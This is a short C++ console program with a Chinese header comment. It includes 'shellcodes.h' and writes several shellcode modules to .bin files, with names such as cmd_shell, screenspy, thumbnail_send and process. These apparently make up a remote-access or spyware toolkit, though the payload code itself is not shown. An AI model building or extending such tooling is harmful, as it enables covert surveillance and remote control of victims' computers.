// functions.cpp : 定义控制台应用程序的入口点。
//
#include "shellcodes.h"
#include "global_data.h"

#include <ShlObj.h>

int _tmain(int argc, _TCHAR* argv[])
{
  printf("extra size = %d\n", sizeof(extra_t));

  shellcode_main_save("main.bin");
  information_save("information.bin");
  cmd_shell_save("cmd_shell.bin");
  thumbnail_send_save("thumbnail.bin");
  screenspy_save("screenspy.bin");
  process_save("process.bin");

	return 0;
}